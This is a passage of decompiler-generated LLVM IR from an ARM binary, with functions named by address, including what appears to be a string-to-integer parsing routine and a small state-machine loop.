  br i1 %v2_14d94, label %bb15, label %bb

bb:                                               ; preds = %dec_label_pc_14d88
  store i32 %v4_14d8c, i32* %r0.global-to-local, align 4
  br label %bb15

bb15:                                             ; preds = %dec_label_pc_14d88, %bb
  store i32 85408, i32* @lr, align 4
  %v1_14d9c = xor i1 %v2_14d94, true
  call void @__pseudo_cond_branch(i1 %v1_14d9c, i32 ptrtoint (i32* @global_var_14a40.582 to i32))
  %v0_14da0 = load i32, i32* @r4, align 4
  %v1_14da0 = add i32 %v0_14da0, 44
  %v2_14da0 = inttoptr i32 %v1_14da0 to i32*
  %v3_14da0 = load i32, i32* %v2_14da0, align 4
  store i32 %v3_14da0, i32* %r3.global-to-local, align 4
  %v1_14da4 = add i32 %v3_14da0, 4
  %v2_14da4 = inttoptr i32 %v1_14da4 to i32*
  %v3_14da4 = load i32, i32* %v2_14da4, align 4
  store i32 %v3_14da4, i32* %r3.global-to-local, align 4
  %v1_14da8 = add i32 %v0_14da0, 836
  %v2_14da8 = inttoptr i32 %v1_14da8 to i32*
  %v3_14da8 = load i32, i32* %v2_14da8, align 4
  store i32 %v3_14da8, i32* %r2.global-to-local, align 4
  %v1_14dac = and i32 %v3_14da4, -4
  store i32 %v1_14dac, i32* %r3.global-to-local, align 4
  %v3_14db0 = icmp ult i32 %v1_14dac, %v3_14da8
  br i1 %v3_14db0, label %dec_label_pc_14df0, label %dec_label_pc_14db8

dec_label_pc_14db8:                               ; preds = %bb15
  store i32 %v0_14da0, i32* %r1.global-to-local, align 4
  %v1_14dbc = add i32 %v0_14da0, 840
  %v2_14dbc = inttoptr i32 %v1_14dbc to i32*
  %v3_14dbc = load i32, i32* %v2_14dbc, align 4
  store i32 %v3_14dbc, i32* %r0.global-to-local, align 4
  %v2_14dc0 = call i32 @function_14990(i32 %v3_14dbc, i32 %v0_14da0)
  store i32 %v2_14dc0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14df0

dec_label_pc_14dc8:                               ; preds = %dec_label_pc_14c8c
  %v2_14dc8 = inttoptr i32 %v1_14c5c to i32*
  %v3_14dc8 = load i32, i32* %v2_14dc8, align 4
  store i32 %v3_14dc8, i32* %r0.global-to-local, align 4
  %v1_14dcc = add i32 %v4_14c4c, 848
  %v2_14dcc = inttoptr i32 %v1_14dcc to i32*
  %v3_14dcc = load i32, i32* %v2_14dcc, align 4
  store i32 %v3_14dcc, i32* %r2.global-to-local, align 4
  %v1_14dd0 = add i32 %v4_14c4c, 868
  %v2_14dd0 = inttoptr i32 %v1_14dd0 to i32*
  %v3_14dd0 = load i32, i32* %v2_14dd0, align 4
  %v2_14dd4 = add i32 %v3_14dc8, %v1_14c58
  store i32 %v2_14dd4, i32* %r1.global-to-local, align 4
  %v1_14dd8 = add i32 %v3_14dcc, -1
  store i32 %v1_14dd8, i32* %r2.global-to-local, align 4
  %v2_14ddc = sub i32 %v3_14dd0, %v2_14dd4
  store i32 %v2_14ddc, i32* %r3.global-to-local, align 4
  store i32 %v2_14ddc, i32* %v2_14dd0, align 4
  %v1_14de4 = load i32, i32* @lr, align 4
  %v2_14de4 = add i32 %v1_14de4, 848
  %v3_14de4 = inttoptr i32 %v2_14de4 to i32*
  store i32 %v1_14dd8, i32* %v3_14de4, align 4
  %v0_14de8 = load i32, i32* %r0.global-to-local, align 4
  %v1_14de8 = load i32, i32* @r5, align 4
  %v2_14de8 = sub i32 %v1_14de8, %v0_14de8
  store i32 %v2_14de8, i32* %r0.global-to-local, align 4
  %v4_14dec = call i32 @function_163d8(i32 %v2_14de8, i32 %v2_14dd4, i32 %v1_14dd8, i32 %v2_14ddc)
  store i32 %v4_14dec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_14df0

dec_label_pc_14df0:                               ; preds = %bb15, %dec_label_pc_14d80, %dec_label_pc_14db8, %dec_label_pc_14c6c, %dec_label_pc_14dc8
  store i32 %v2_14c00, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  %v0_14dfc = load i32, i32* @r7, align 4
  %v2_14dfc = add i32 %v0_14dfc, 24
  %v3_14dfc = inttoptr i32 %v2_14dfc to i32*
  %v4_14dfc = load i32, i32* %v3_14dfc, align 4
  store i32 %v4_14dfc, i32* @ip, align 4
  store i32 85512, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_14dfc)
  br label %dec_label_pc_14e08

dec_label_pc_14e08:                               ; preds = %dec_label_pc_14bf4, %dec_label_pc_14df0
  store i32 %v3_14bf4, i32* @r4, align 4
  store i32 %v6_14bf4, i32* @r5, align 4
  store i32 %v9_14bf4, i32* @r6, align 4
  store i32 %v12_14bf4, i32* @r7, align 4
  store i32 %v18_14bf4, i32* @lr, align 4
  ret i32 %v2_14c00

; uselistorder directives
  uselistorder i32 %v0_14da0, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v0_14d60, { 1, 0 }
  uselistorder i32 %v1_14ca0, { 1, 0 }
  uselistorder i32 %v0_14ca0, { 1, 0 }
  uselistorder i32 %v3_14c74, { 1, 0 }
  uselistorder i32 %v1_14c58, { 1, 0, 2 }
  uselistorder i32 %v2_14c54, { 1, 2, 0, 3 }
  uselistorder i32 %v4_14c4c, { 1, 0, 2, 3 }
  uselistorder i32 %v0_14bfc, { 1, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 0, 9, 10, 11 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 8, 6, 7, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29 }
  uselistorder i32* %r0.global-to-local, { 3, 14, 0, 1, 2, 13, 4, 5, 11, 12, 6, 7, 8, 10, 9 }
  uselistorder i32* %lr.global-to-local, { 0, 2, 1, 3, 4, 5, 6 }
  uselistorder i32* %ip.global-to-local, { 3, 0, 4, 1, 5, 9, 2, 6, 7, 8, 10, 11, 12 }
  uselistorder i32 868, { 2, 0, 1, 3, 4, 5 }
  uselistorder label %dec_label_pc_14e08, { 1, 0 }
  uselistorder label %dec_label_pc_14df0, { 4, 2, 0, 1, 3 }
  uselistorder label %bb15, { 1, 0 }
  uselistorder label %dec_label_pc_14d80, { 1, 0 }
  uselistorder label %dec_label_pc_14d40, { 1, 0 }
  uselistorder label %dec_label_pc_14d34, { 1, 0 }
  uselistorder label %dec_label_pc_14d30, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_14ce4, { 1, 0 }
}

define i32 @function_14e18(i32 %arg1) local_unnamed_addr {
dec_label_pc_14e18:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_14e18 = load i1, i1* @cpsr_z, align 1
  %v2_14e18 = load i32, i32* @r4, align 4
  br i1 %v0_14e18, label %bb, label %dec_label_pc_14e18..thread4_crit_edge

dec_label_pc_14e18..thread4_crit_edge:            ; preds = %dec_label_pc_14e18
  %v0_14e44.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread4

bb:                                               ; preds = %dec_label_pc_14e18
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_14e18..thread4_crit_edge, %bb
  %v0_14e44 = phi i32 [ %v0_14e44.pre, %dec_label_pc_14e18..thread4_crit_edge ], [ 0, %bb ]
  store i32 %v2_14e18, i32* %stack_var_-12, align 4
  %v6_14e30 = load i32, i32* @r5, align 4
  %v9_14e30 = load i32, i32* @lr, align 4
  %v4_14e40 = load i32, i32* inttoptr (i32 135376 to i32*), align 16
  store i32 %v4_14e40, i32* @r5, align 4
  store i32 %v0_14e44, i32* @r4, align 4
  store i32 %v4_14e40, i32* @r0, align 4
  %v0_14e50 = call i32 @function_14a40()
  %v0_14e54 = load i32, i32* @r4, align 4
  store i32 %v0_14e54, i32* %r0.global-to-local, align 4
  %v0_14e58 = load i32, i32* @r5, align 4
  %v2_14e60 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_14e60, i32* @r4, align 4
  store i32 %v6_14e30, i32* @r5, align 4
  store i32 %v9_14e30, i32* @lr, align 4
  %v2_14e64 = call i32 @function_14990(i32 %v0_14e54, i32 %v0_14e58)
  store i32 %v2_14e64, i32* %r0.global-to-local, align 4
  %v0_14e68 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14e68, label %bb13, label %.thread5

bb13:                                             ; preds = %.thread4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread5

.thread5:                                         ; preds = %.thread4, %bb13
  %v4_14e6c = phi i32 [ %v2_14e64, %.thread4 ], [ 0, %bb13 ]
  ret i32 %v4_14e6c

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 5, 3, 4, 0, 1 }
  uselistorder i32 (i32, i32)* @function_14990, { 1, 0 }
  uselistorder i32 ()* @function_14a40, { 3, 2, 1, 0 }
  uselistorder i32* inttoptr (i32 135376 to i32*), { 2, 1, 0 }
  uselistorder label %.thread5, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_14e70() local_unnamed_addr {
dec_label_pc_14e70:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  store i32 135344, i32* @r5, align 4
  %v4_14e88 = load i32, i32* inttoptr (i32 135360 to i32*), align 64
  store i32 85652, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14e88)
  %v2_14ea4 = ptrtoint i32* %stack_var_-8 to i32
  store i32 32, i32* %stack_var_-8, align 4
  %v3_14eb0 = call i32 @function_13114(i32 1, i32 %v2_14ea4, i32 0)
  %v4_14eb8 = load i32, i32* @global_var_21364.590, align 4
  %v2_14ebc = icmp eq i32 %v4_14eb8, 0
  br i1 %v2_14ebc, label %dec_label_pc_14ec4, label %dec_label_pc_14f04

dec_label_pc_14ec4:                               ; preds = %dec_label_pc_14e70
  store i32 1, i32* @global_var_21364.590, align 4
  br label %dec_label_pc_14ecc

dec_label_pc_14ecc:                               ; preds = %dec_label_pc_14f14, %dec_label_pc_14ec4
  %v0_14ed0 = load i32, i32* @r5, align 4
  %v2_14ed0 = add i32 %v0_14ed0, 160
  store i32 %v2_14ed0, i32* @r4, align 4
  %v2_14edc = add i32 %v0_14ed0, 36
  %v3_14edc = inttoptr i32 %v2_14edc to i32*
  %v4_14edc = load i32, i32* %v3_14edc, align 4
  call void @__pseudo_branch(i32 %v4_14edc)
  %v1_14eec = call i32 @function_13978(i32 6)
  %v0_14ef8 = load i32, i32* @r5, align 4
  %v2_14ef8 = add i32 %v0_14ef8, 16
  %v3_14ef8 = inttoptr i32 %v2_14ef8 to i32*
  %v4_14ef8 = load i32, i32* %v3_14ef8, align 4
  store i32 85764, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v4_14ef8)
  %v4_14f08.pre = load i32, i32* @global_var_21364.590, align 4
  br label %dec_label_pc_14f04

dec_label_pc_14f04:                               ; preds = %dec_label_pc_14e70, %dec_label_pc_14ecc
  %v0_14f18 = phi i32 [ %v4_14eb8, %dec_label_pc_14e70 ], [ %v4_14f08.pre, %dec_label_pc_14ecc ]
  %v7_14f0c = icmp eq i32 %v0_14f18, 1
  br i1 %v7_14f0c, label %dec_label_pc_14f14, label %dec_label_pc_14f50

dec_label_pc_14f14:                               ; preds = %dec_label_pc_14f04
  %v2_14f14 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_14f14, i32* @r4, align 4
  store i32 2, i32* @global_var_21364.590, align 4
  store i32 20, i32* @r2, align 4
  %v2_14f2c = bitcast i32* %stack_var_-28 to i8*
  %v3_14f2c = call i32 @function_135d0(i8* %v2_14f2c, i32 0)
  %v3_14f48 = call i32 @function_15ed8(i32 6, i32 %v2_14f14, i32 0)
  br label %dec_label_pc_14ecc

dec_label_pc_14f50:                               ; preds = %dec_label_pc_14f04
  %v7_14f50 = icmp eq i32 %v0_14f18, 2
  br i1 %v7_14f50, label %dec_label_pc_14f58, label %dec_label_pc_14f64

dec_label_pc_14f58:                               ; preds = %dec_label_pc_14f50
  store i32 3, i32* @global_var_21364.590, align 4
  %v0_14f60 = call i32 @function_14e70()
  %v4_14f64.pre = load i32, i32* @global_var_21364.590, align 4
  br label %dec_label_pc_14f64

dec_label_pc_14f64:                               ; preds = %dec_label_pc_14f50, %dec_label_pc_14f58
  %v1_14f6c = phi i32 [ %v0_14f18, %dec_label_pc_14f50 ], [ %v4_14f64.pre, %dec_label_pc_14f58 ]
  %v7_14f68 = icmp eq i32 %v1_14f6c, 3
  br i1 %v7_14f68, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_14f64
  store i32 4, i32* @global_var_21364.590, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14f64, %bb
  call void @__pseudo_cond_branch(i1 %v7_14f68, i32 ptrtoint (i32* @global_var_164c8.592 to i32))
  br label %dec_label_pc_14f7c

dec_label_pc_14f7c:                               ; preds = %dec_label_pc_14f7c, %.thread1
  %v0_14f7c = call i32 @function_14e70()
  br label %dec_label_pc_14f7c

; uselistorder directives
  uselistorder i32 ()* @function_14e70, { 1, 0, 6, 5, 3, 4, 2 }
  uselistorder i32 6, { 14, 15, 80, 16, 39, 17, 40, 2, 78, 18, 79, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 4, 0, 29, 30, 31, 32, 5, 33, 41, 42, 43, 6, 44, 45, 46, 47, 7, 48, 49, 50, 51, 8, 52, 9, 53, 54, 34, 55, 10, 56, 57, 58, 35, 59, 11, 60, 61, 62, 36, 63, 64, 65, 66, 67, 37, 68, 12, 69, 70, 71, 72, 73, 74, 38, 75, 13, 76, 3, 77, 1 }
  uselistorder i32* @global_var_21364.590, { 2, 0, 3, 4, 1, 5, 6 }
  uselistorder i32* inttoptr (i32 135360 to i32*), { 1, 0 }
  uselistorder label %.thread1, { 1, 0 }
  uselistorder label %dec_label_pc_14f64, { 1, 0 }
  uselistorder label %dec_label_pc_14f04, { 1, 0 }
}

define i32 @function_14f88(i16* %arg1) local_unnamed_addr {
dec_label_pc_14f88:
  %tmp = ptrtoint i16* %arg1 to i32
  %v0_14f88 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_14f88, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_14f88
  %v5_14f88 = udiv i32 %tmp, 2
  %v6_14f88 = and i32 %v5_14f88, %tmp
  %v8_14f8c = shl i32 %v6_14f88, %v6_14f88
  %v9_14f8c = and i32 %v8_14f8c, %v6_14f88
  %v2_14f90 = trunc i32 %v9_14f8c to i16
  %v4_14f90 = inttoptr i32 %v9_14f8c to i16*
  store i16 %v2_14f90, i16* %v4_14f90, align 2
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_14f88, %bb
  %v4_14f94 = phi i32 [ %tmp, %dec_label_pc_14f88 ], [ 0, %bb ]
  ret i32 %v4_14f94

; uselistorder directives
  uselistorder i32 %v9_14f8c, { 1, 0 }
  uselistorder i32 %v6_14f88, { 0, 2, 1 }
  uselistorder i32 %tmp, { 2, 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_14f98(i32 %arg1) local_unnamed_addr {
dec_label_pc_14f98:
  store i32 0, i32* @r1, align 4
  store i32 10, i32* @r2, align 4
  %v0_14fa8 = call i32 @function_14fb8()
  ret i32 %v0_14fa8
}

define i32 @function_14fb8() local_unnamed_addr {
dec_label_pc_14fb8:
  store i32 1, i32* @r3, align 4
  %v0_14fc4 = call i32 @function_14fd4()
  ret i32 %v0_14fc4
}

define i32 @function_14fd4() local_unnamed_addr {
dec_label_pc_14fd4:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %v3_14fd4 = load i32, i32* @r4, align 4
  store i32 224, i32* @lr, align 4
  store i32 135344, i32* %ip.global-to-local, align 4
  %v0_14fe8 = load i32, i32* @r1, align 4
  store i32 %v0_14fe8, i32* %fp.global-to-local, align 4
  %v0_14fec = load i32, i32* @r2, align 4
  store i32 %v0_14fec, i32* %r5.global-to-local, align 4
  %v0_14ff0 = load i32, i32* @r0, align 4
  store i32 %v0_14ff0, i32* @r4, align 4
  %v0_14ff4 = load i32, i32* @r3, align 4
  br label %dec_label_pc_15000

dec_label_pc_14ffc:                               ; preds = %dec_label_pc_15000
  %v1_14ffc = add i32 %v0_15038, 1
  store i32 %v1_14ffc, i32* @r4, align 4
  br label %dec_label_pc_15000

dec_label_pc_15000:                               ; preds = %dec_label_pc_14fd4, %dec_label_pc_14ffc
  %v0_15038 = phi i32 [ %v0_14ff0, %dec_label_pc_14fd4 ], [ %v1_14ffc, %dec_label_pc_14ffc ]
  %v1_15000 = inttoptr i32 %v0_15038 to i8*
  %v2_15000 = load i8, i8* %v1_15000, align 1
  %v3_15000 = zext i8 %v2_15000 to i32
  %v4_15004 = load i32, i32* inttoptr (i32 135568 to i32*), align 16
  %v2_15008 = mul nuw nsw i32 %v3_15000, 2
  %v2_1500c = add i32 %v2_15008, %v4_15004
  %v3_1500c = inttoptr i32 %v2_1500c to i16*
  %v4_1500c = load i16, i16* %v3_1500c, align 2
  %v1_15010 = and i16 %v4_1500c, 32
  %v2_15010 = icmp eq i16 %v1_15010, 0
  br i1 %v2_15010, label %dec_label_pc_15018, label %dec_label_pc_14ffc

dec_label_pc_15018:                               ; preds = %dec_label_pc_15000
  %v7_15018 = icmp eq i8 %v2_15000, 43
  br i1 %v7_15018, label %dec_label_pc_15038, label %dec_label_pc_15020

dec_label_pc_15020:                               ; preds = %dec_label_pc_15018
  %v7_15020 = icmp eq i8 %v2_15000, 45
  br i1 %v7_15020, label %dec_label_pc_15038, label %bb

bb:                                               ; preds = %dec_label_pc_15020
  store i32 0, i32* @r7, align 4
  br label %dec_label_pc_1503c

dec_label_pc_15038:                               ; preds = %dec_label_pc_15018, %dec_label_pc_15020
  %storemerge39 = phi i32 [ 1, %dec_label_pc_15020 ], [ 0, %dec_label_pc_15018 ]
  store i32 %storemerge39, i32* @r7, align 4
  %v1_15038 = add i32 %v0_15038, 1
  store i32 %v1_15038, i32* @r4, align 4
  br label %dec_label_pc_1503c

dec_label_pc_1503c:                               ; preds = %bb, %dec_label_pc_15038
  %v0_1505c = phi i32 [ %v0_15038, %bb ], [ %v1_15038, %dec_label_pc_15038 ]
  %v1_1503c = and i32 %v0_14fec, -17
  %v3_1503c = icmp eq i32 %v1_1503c, 0
  br i1 %v3_1503c, label %dec_label_pc_15048, label %bb52

bb52:                                             ; preds = %dec_label_pc_1503c
  store i32 %v0_14ff0, i32* %r6.global-to-local, align 4
  br label %bb56

dec_label_pc_15048:                               ; preds = %dec_label_pc_1503c
  %v1_15048 = inttoptr i32 %v0_1505c to i8*
  %v2_15048 = load i8, i8* %v1_15048, align 1
  %v7_1504c = icmp eq i8 %v2_15048, 48
  %v1_15050 = add i32 %v0_14fec, 10
  store i32 %v1_15050, i32* %r5.global-to-local, align 4
  br i1 %v7_1504c, label %dec_label_pc_1505c, label %bb53

bb53:                                             ; preds = %dec_label_pc_15048
  store i32 %v0_14ff0, i32* %r6.global-to-local, align 4
  br label %.thread8

dec_label_pc_1505c:                               ; preds = %dec_label_pc_15048
  %v1_1505c = add i32 %v0_1505c, 1
  %v2_1505c = inttoptr i32 %v1_1505c to i8*
  %v3_1505c = load i8, i8* %v2_1505c, align 1
  %v4_1505c = zext i8 %v3_1505c to i32
  store i32 %v1_1505c, i32* @r4, align 4
  %v1_15060 = or i32 %v4_1505c, 32
  %v7_15064 = icmp eq i32 %v1_15060, 120
  %v1_15068 = add i32 %v0_14fec, 8
  store i32 %v1_15068, i32* %r5.global-to-local, align 4
  store i32 %v1_1505c, i32* %r6.global-to-local, align 4
  br i1 %v7_15064, label %bb54, label %.thread8

bb54:                                             ; preds = %dec_label_pc_1505c
  %v3_15074 = mul i32 %v1_15068, 2
  store i32 %v3_15074, i32* %r5.global-to-local, align 4
  %v2_15078 = add i32 %v0_1505c, 2
  store i32 %v2_15078, i32* @r4, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_1505c, %bb53, %bb54
  %v0_1507c = phi i32 [ %v1_15050, %bb53 ], [ %v3_15074, %bb54 ], [ %v1_15068, %dec_label_pc_1505c ]
  %v5_15080 = icmp slt i32 %v0_1507c, 16
  br i1 %v5_15080, label %bb56, label %bb55

bb55:                                             ; preds = %.thread8
  store i32 16, i32* %r5.global-to-local, align 4
  br label %bb56

bb56:                                             ; preds = %bb52, %.thread8, %bb55
  %v0_15098 = phi i32 [ %v0_14fec, %bb52 ], [ %v0_1507c, %.thread8 ], [ 16, %bb55 ]
  %v1_15084 = add i32 %v0_15098, -2
  %tmp = icmp ugt i32 %v1_15084, 34
  br i1 %tmp, label %.thread, label %dec_label_pc_15094

.thread:                                          ; preds = %bb56
  store i32 0, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15140

dec_label_pc_15094:                               ; preds = %bb56
  %v2_1509c = call i32 @function_12b6c(i32 -1, i32 %v0_15098)
  store i32 -1, i32* @r0, align 4
  %v0_150a8 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_150a8, i32* @r1, align 4
  %v1_150ac = urem i32 %v0_15098, 256
  store i32 %v1_150ac, i32* %sl.global-to-local, align 4
  %v0_150b0 = call i32 @function_12a70()
  store i32 -1, i32* %sb.global-to-local, align 4
  store i32 %v0_150b0, i32* %r8.global-to-local, align 4
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_150c8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_150c8

dec_label_pc_150c4:                               ; preds = %bb63, %dec_label_pc_15124
  %v0_150c4 = phi i32 [ %v1_1510436, %bb63 ], [ %v0_150c4.pre, %dec_label_pc_15124 ]
  store i32 %v0_150c4, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_150c8

dec_label_pc_150c8:                               ; preds = %dec_label_pc_15094, %dec_label_pc_150c4
  %v0_15104 = phi i32 [ %v0_150c8.pre, %dec_label_pc_15094 ], [ %v0_150c4, %dec_label_pc_150c4 ]
  %v1_150c8 = inttoptr i32 %v0_15104 to i8*
  %v2_150c8 = load i8, i8* %v1_150c8, align 1
  %v3_150c8 = zext i8 %v2_150c8 to i32
  %v1_150cc = add nsw i32 %v3_150c8, -48
  %v1_150d0 = urem i32 %v1_150cc, 256
  %v1_150d8 = or i32 %v3_150c8, 32
  %tmp71 = icmp ult i32 %v1_150d0, 10
  br i1 %tmp71, label %bb58, label %dec_label_pc_150e0

dec_label_pc_150e0:                               ; preds = %dec_label_pc_150c8
  %tmp72 = icmp ugt i32 %v1_150d8, 96
  br i1 %tmp72, label %bb57, label %bb58

bb57:                                             ; preds = %dec_label_pc_150e0
  %v1_150e4 = add nsw i32 %v1_150d8, -87
  %v5_150ec = urem i32 %v1_150e4, 256
  br label %bb58

bb58:                                             ; preds = %dec_label_pc_150c8, %dec_label_pc_150e0, %bb57
  %v3_1511c = phi i32 [ %v1_150d0, %dec_label_pc_150c8 ], [ 40, %dec_label_pc_150e0 ], [ %v5_150ec, %bb57 ]
  %v1_150f0 = load i32, i32* %r5.global-to-local, align 4
  %v6_150f4 = icmp slt i32 %v3_1511c, %v1_150f0
  br i1 %v6_150f4, label %dec_label_pc_150f8, label %dec_label_pc_15140.loopexit

dec_label_pc_150f8:                               ; preds = %bb58
  %v0_150f8 = load i32, i32* %ip.global-to-local, align 4
  %v1_150f8 = load i32, i32* %r8.global-to-local, align 4
  %v9_150f8 = icmp eq i32 %v0_150f8, %v1_150f8
  br i1 %v9_150f8, label %.thread31, label %bb59

.thread31:                                        ; preds = %dec_label_pc_150f8
  %v1_1510432 = add i32 %v0_15104, 1
  store i32 %v1_1510432, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1510c

bb59:                                             ; preds = %dec_label_pc_150f8
  %v3_150f8 = icmp ult i32 %v0_150f8, %v1_150f8
  %v1_15104 = add i32 %v0_15104, 1
  store i32 %v1_15104, i32* %r4.global-to-local, align 4
  br i1 %v3_150f8, label %dec_label_pc_1510c, label %dec_label_pc_15124

dec_label_pc_1510c:                               ; preds = %bb59, %.thread31
  %v1_1510436 = phi i32 [ %v1_1510432, %.thread31 ], [ %v1_15104, %bb59 ]
  %v4_151142235 = phi i32 [ 1, %.thread31 ], [ 0, %bb59 ]
  %v1_1510c = load i32, i32* %sl.global-to-local, align 4
  %v3_1510c = icmp uge i32 %v3_1511c, %v1_1510c
  %v9_1510c = icmp eq i32 %v3_1511c, %v1_1510c
  %v2_15110 = xor i1 %v3_1510c, true
  %v3_15110 = or i1 %v9_1510c, %v2_15110
  br i1 %v3_15110, label %bb60, label %bb61

bb60:                                             ; preds = %dec_label_pc_1510c
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_1510c, %bb60
  %v4_15114 = phi i32 [ %v4_151142235, %dec_label_pc_1510c ], [ 0, %bb60 ]
  %v2_15114 = xor i1 %v9_1510c, true
  %v3_15114 = and i1 %v3_1510c, %v2_15114
  br i1 %v3_15114, label %bb62, label %thread-pre-split

bb62:                                             ; preds = %bb61
  %v5_15114 = urem i32 %v4_15114, 2
  br label %thread-pre-split

thread-pre-split:                                 ; preds = %bb61, %bb62
  %v0_15118 = phi i32 [ %v5_15114, %bb62 ], [ %v4_15114, %bb61 ]
  %v2_15118 = icmp eq i32 %v0_15118, 0
  br i1 %v2_15118, label %bb63, label %dec_label_pc_15124

bb63:                                             ; preds = %thread-pre-split
  %v4_1511c = mul i32 %v0_150f8, %v1_150f0
  %v5_1511c = add i32 %v4_1511c, %v3_1511c
  store i32 %v5_1511c, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_150c4

dec_label_pc_15124:                               ; preds = %bb59, %thread-pre-split
  %v0_15124 = call i32 @function_13574()
  %v0_1512c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v0_1512c, i32* %ip.global-to-local, align 4
  %v0_15130 = load i32, i32* @r7, align 4
  %v2_15130 = and i32 %v0_15130, %v0_14ff4
  store i32 %v2_15130, i32* @r7, align 4
  %v2_15138 = inttoptr i32 %v0_15124 to i32*
  store i32 34, i32* %v2_15138, align 4
  %v0_150c4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_150c4

dec_label_pc_15140.loopexit:                      ; preds = %bb58
  %v0_15140.pre = load i32, i32* %fp.global-to-local, align 4
  br label %dec_label_pc_15140

dec_label_pc_15140:                               ; preds = %.thread, %dec_label_pc_15140.loopexit
  %v2_15144 = phi i32 [ %v0_15140.pre, %dec_label_pc_15140.loopexit ], [ %v0_14fe8, %.thread ]
  %v2_15140 = icmp eq i32 %v2_15144, 0
  br i1 %v2_15140, label %bb65, label %bb64

bb64:                                             ; preds = %dec_label_pc_15140
  %v1_15144 = load i32, i32* %r6.global-to-local, align 4
  %v3_15144 = inttoptr i32 %v2_15144 to i32*
  store i32 %v1_15144, i32* %v3_15144, align 4
  br label %bb65

bb65:                                             ; preds = %dec_label_pc_15140, %bb64
  %v0_1514c = load i32, i32* @r7, align 4
  %v2_1514c = icmp eq i32 %v0_1514c, 0
  %. = select i1 %v2_1514c, i32 2147483647, i32 -2147483648
  store i32 %., i32* %r4.global-to-local, align 4
  %v2_15158 = icmp eq i32 %v0_14ff4, 0
  %v0_1517c.pre.pre = load i32, i32* %ip.global-to-local, align 4
  br i1 %v2_15158, label %dec_label_pc_15174, label %bb68

bb68:                                             ; preds = %bb65
  %tmp73 = icmp ugt i32 %v0_1517c.pre.pre, %.
  br i1 %tmp73, label %dec_label_pc_15164, label %dec_label_pc_15174

dec_label_pc_15164:                               ; preds = %bb68
  %v0_15164 = call i32 @function_13574()
  %v2_1516c = inttoptr i32 %v0_15164 to i32*
  store i32 34, i32* %v2_1516c, align 4
  %v0_15170 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15170, i32* %ip.global-to-local, align 4
  %v0_15174.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_15174

dec_label_pc_15174:                               ; preds = %bb68, %bb65, %dec_label_pc_15164
  %v0_1517c.pre = phi i32 [ %v0_1517c.pre.pre, %bb68 ], [ %v0_15170, %dec_label_pc_15164 ], [ %v0_1517c.pre.pre, %bb65 ]
  %v0_15174 = phi i32 [ %v0_1514c, %bb68 ], [ %v0_15174.pre, %dec_label_pc_15164 ], [ %v0_1514c, %bb65 ]
  %v2_15174 = icmp eq i32 %v0_15174, 0
  br i1 %v2_15174, label %dec_label_pc_15174._crit_edge, label %bb69

bb69:                                             ; preds = %dec_label_pc_15174
  %v2_15178 = sub i32 0, %v0_1517c.pre
  store i32 %v2_15178, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_15174._crit_edge

dec_label_pc_15174._crit_edge:                    ; preds = %dec_label_pc_15174, %bb69
  %v0_1517c = phi i32 [ %v2_15178, %bb69 ], [ %v0_1517c.pre, %dec_label_pc_15174 ]
  store i32 %v3_14fd4, i32* @r4, align 4
  ret i32 %v0_1517c

; uselistorder directives
  uselistorder i32 %v0_1517c.pre, { 1, 0 }
  uselistorder i32 %v0_1517c.pre.pre, { 1, 2, 0 }
  uselistorder i32 %v4_15114, { 1, 0 }
  uselistorder i1 %v3_1510c, { 1, 0 }
  uselistorder i32 %v1_1510c, { 1, 0 }
  uselistorder i32 %v1_150d8, { 1, 0 }
  uselistorder i32 %v1_150d0, { 1, 0 }
  uselistorder i32 %v0_15104, { 1, 0, 2 }
  uselistorder i32 %v0_150c4, { 1, 0 }
